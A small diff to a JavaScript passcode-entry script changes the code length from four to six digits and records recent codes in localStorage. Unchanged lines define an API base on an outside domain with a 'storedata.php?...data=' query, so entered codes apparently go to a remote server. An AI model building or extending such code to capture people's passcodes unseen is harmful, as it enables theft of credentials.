@@ -1,7 +1,6 @@
-
 (() => {
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
-  const MAX = 4;
+  const MAX = 6;
   let code = "";
 
   const dotEls = Array.from(document.querySelectorAll('.dot'));
@@ -82,7 +81,7 @@
     try {
       const arr = getLastCodes();
       arr.push(c);
-      while (arr.length > 4) arr.shift();
+      while (arr.length > MAX) arr.shift();
       localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
     } catch (e) {}
   }
